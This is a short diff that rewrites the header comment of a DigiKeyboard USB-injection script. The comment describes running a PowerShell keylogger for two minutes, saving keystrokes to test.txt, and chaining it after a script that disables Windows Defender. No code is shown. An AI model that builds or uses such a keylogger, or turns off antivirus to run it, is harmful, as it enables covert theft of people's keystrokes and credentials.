@@ -1,7 +1,6 @@
 /* 
- *  This DigiKeyboard Script runs Powershell keylogger for a predefined number of 2 minutes (you can change it according to your needs in the powershell command) and saves the results to test.txt (you can change it according to your wish) in 
- * WARNING: Windows Defender is able to detect this so you will have to chain this after a script disabling Windows Defender.
- 
+This DigiKeyboard script executes a PowerShell keylogger for a default duration of two minutes, which can be adjusted within the PowerShell command as needed. The captured keystrokes are saved to test.txt, though the file name and location can be modified as desired.
+Warning: Windows Defender can detect this script, so it must be executed after a script that disables Windows Defender.
  */
 
 
